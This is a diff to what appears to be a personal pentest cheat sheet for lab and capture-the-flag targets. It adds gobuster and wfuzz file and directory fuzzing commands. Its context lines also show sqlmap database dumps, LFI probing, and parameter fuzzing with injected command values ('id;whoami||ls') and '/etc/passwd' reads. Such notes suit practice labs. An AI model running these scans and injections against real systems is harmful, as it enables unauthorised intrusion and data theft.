@@ -7,6 +7,19 @@
 sudo nmap -A -o scan_agsv.txt 10.10.10.218
 sudo nmap -sS -p- -o scan_full.txt 10.10.10.218
 ```
+### Fuzzing files
+```powershell
+wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ.php
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt -u http://10.10.240.162:8001 -t 40
+```
+
+### Fuzzing dir
+```powershell
+gobuster -u http://broadcast.vulnnet.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster -u http://10.10.236.248 -w SecLists-master/Discovery/Web-Content/common.txt
+wfuzz -w wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ
+```
+
 ### Fuzzing subdomains
 ```powershell
 wfuzz -w subdomains-top1million-5000.txt -H "Host: FUZZ.vulnnet.thm" --hc 200 10.10.236.248
@@ -19,7 +32,6 @@ sqlmap -r ./test_user --dbms=MySQL --current-db
 sqlmap -r ./test_user --dbms=MySQL -D marketplace --dump
 ```
 
-
 ### LFI
 ```powershell
 python ./panoptic.py --url http://vulnnet.thm/\?referer\=test
@@ -29,12 +41,6 @@ python ./panoptic.py --url http://vulnnet.thm/\?referer\=test
 ```powershell
 wfuzz -w SecLists-master/Discovery/Web-Content/burp-parameter-names.txt http://vulnnet.thm/\?\FUZZ\=id\;whoami\|\|ls
 wfuzz --hh 5829 -w ~/Documents/SecLists-master/Discovery/Web-Content/burp-parameter-names.txt http://vulnnet.thm/\?\FUZZ\=/etc/passwd
-```
-
-### Fuzzing dir
-```powershell
-gobuster -u http://broadcast.vulnnet.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-gobuster -u http://10.10.236.248 -w SecLists-master/Discovery/Web-Content/common.txt
 ```
 
 ### Wordpress
